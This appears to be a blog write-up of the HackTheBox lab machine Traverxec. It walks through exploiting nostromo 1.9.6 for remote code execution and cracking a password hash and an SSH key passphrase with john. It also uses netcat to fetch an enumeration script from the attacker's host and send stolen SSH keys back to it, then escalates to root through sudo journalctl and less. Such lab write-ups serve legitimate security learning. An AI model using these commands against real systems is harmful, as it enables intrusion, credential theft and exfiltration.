---
layout: post
title: "HackTheBox :: Traverxec"
categories: writeups
---

# HackTheBox :: Traverxec

## Initial Enumeration
Let's start by running a *somewhat* extensive nmap scan.
```
$ nmap -sCSV -p 1-20000 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 21:19 AEDT
Nmap scan report for 10.10.10.165
Host is up (0.054s latency).
Not shown: 19998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
<br />

So first thing we see is that port 80 is open. What is nostromo? Let's do a quick check on searchsploit to see if we find anything.
```
$ searchsploit nostromo
---------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                              |  Path                                  
                                                                            | (/usr/share/exploitdb/)
---------------------------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)        | exploits/multiple/remote/47573.rb
---------------------------------------------------------------------------- ----------------------------------------
```
<br />

Very interesting. It appears that there is a RCE vulnerability in the nostromo framework. Let's boot up msfconsole and see if we can get it to work.

## Initial Foothold
Wow, the metasploit exploit actually worked. This doesn't normally happen? I guess that's our initial foothold in the bag.
```
www-data@traverxec:/var$ ls
ls
backups  cache  lib  local  lock  log  mail  nostromo  opt  run  spool  tmp
www-data@traverxec:/var$ 
```
<br />

## Getting User
Let's do some initial enumeration. For some reason the upload command in metasploit isn't working, and wget doesn't work either, so let's try netcat.
```
www-data@traverxec:/tmp$ nc 10.10.xx.xx 4444 > LinEnum.sh
```
```
$ nc -lv -p 4444 < LinEnum.sh
```
<br />

Cool, that worked. So let's begin our initial enumeration on the server itself.
```
www-data@traverxec:/tmp$ sh LinEnum.sh

...

-e [-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
-e

...
```
<br />

A hash found in one of the nostromo .htpasswd files? Interesting, let's crack it.
```
$ echo 'david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/' > david.hash
$ john david.hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"                         
Use the "--format=md5crypt-long" option to force loading these as that type instead                                  
Using default input encoding: UTF-8                                                                                  
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])                                
Will run 12 OpenMP threads                                                                                           
Press 'q' or Ctrl-C to abort, almost any other key for status                                                        
Nowonly4me       (david)                                                                                             
1g 0:00:00:24 DONE (2019-12-30 22:48) 0.04144g/s 438409p/s 438409c/s 438409C/s NuiMeanPoon..Norri83                  
Use the "--show" option to display all of the cracked passwords reliably                                             
Session completed
```
<br />

Nice, so now we have a password. We just need to find out what this password is for. A couple quick checks shows us that we can't use it to SSH in as david, nor can we `su - david`. It's probably safe to assume that it's used as http basic authentication.

Well, we didn't get anything from trying that, so let's dig around on the server some more. Maybe a good a idea to look into that nostromo folder.

After literally 2 seconds of digging around the configuration files, I found a file called "nhttpd.conf", so let's take a look at the contents.
```
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
<br />

I have no idea what to make of this, so a quick Google search for the man page for nostromo's configuration file is probably in order.

I found [this](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd). It appears that the home directory is exposed at http://traverxec.htb/~david/. Navigating to this page *somewhat*  confirms this, though it's not really publicly accessible. Likely due to the `homedirs_public` option being set. Surely the permissions for this `public_www` folder must be accessible? I wonder what happens when we try to navigate to it within the shell.
```
www-data@traverxec:/var/nostromo$ cd /home/david/public_www
cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls
ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ 
```
<br />

Huh, that actually worked? I wonder what's in this `protected-file-area` folder? Let's find out.
```
www-data@traverxec:/home/david/public_www$ ls protected-file-area
ls protected-file-area
backup-ssh-identity-files.tgz
```
<br />

Aha! Backup SSH identity files. Let's download these and try to use them. Metasploit's download is being shitty again, so netcat it is.
```
$ nc -lv -p 4444 > backup-ssh-identity-files.tgz
```
```
www-data@traverxec:/home/david/public_www/protected-file-area$ nc 10.10.xx.xx 4444 < \
 > backup-ssh-identity-files.tgz
```
<br />

Let's SSH in.
```
$ ssh -i ssh_david david@10.10.10.165
Enter passphrase for key 'ssh_david':
```
<br />

Yup, that's a password. Time to crack it.
```
$ /usr/share/john/ssh2john.py ssh_david > ssh_david.hash
$ john ssh_david --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (keys/ssh_david)
1g 0:00:00:01 DONE (2019-12-30 23:46) 0.5347g/s 7669Kp/s 7669Kc/s 7669KC/s  0125457423 ..\*7¡Vamos!
Session completed
```
<br />

Now let's SSH in (again).
```
$ ssh -i keys/ssh_david david@10.10.10.165
Enter passphrase for key 'keys/ssh_david': 
david@traverxec:~$ 
```
<br />

Nice. We have the user.txt flag.
```
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
```
<br />

## Getting Root
Digging around david's home directory we find an interesting file.
```
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
<br />

The last line here is particularly interesting. For those that don't know, when journalctl is invoked, if the size of the terminal window isn't large enough, journalctl will open a program called `less` which when run as sudo (like in this file).

So what we can probably gather from this, is that david is able to run the command `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`, even though we can't see the results of `sudo -l`, as we don't know david's password. A quick check confirms this theory.
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Mon 2019-12-30 04:29:46 EST, end at Mon 2019-12-30 11:06:49 EST. --
Dec 30 09:57:59 traverxec sudo[2393]: pam_unix(sudo:auth): conversation failed
Dec 30 09:57:59 traverxec sudo[2393]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Dec 30 09:57:59 traverxec sudo[2393]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
Dec 30 09:58:41 traverxec sudo[2396]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/4 ruser=www-data rhost=  user=www-data
Dec 30 09:58:54 traverxec sudo[2396]: www-data : command not allowed ; TTY=pts/4 ; PWD=/usr/bin ; USER=root ; COMMAND=list
```
<br />

So let's make our terminal window smaller and invoke this command. Allowing us to access `less` as sudo and perform our privilege escalation.
```
root@traverxec:/# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/# 
```
<br />

Nice. Time to get the flag.
```
root@traverxec:/# cat /root/root.txt
9aa36a6d76f785dfd320a478f6e0d906
root@traverxec:/# 
```
<br />

## Lessons Learned
 * Digging around application configuration files can be very important.
 * Reading the man pages for afformentioned config files is important too.
 * You can make inferences about `sudo -l` even if you don't have the user's password.
 * Sometimes weird behaviour of tools can be used to your advantage.
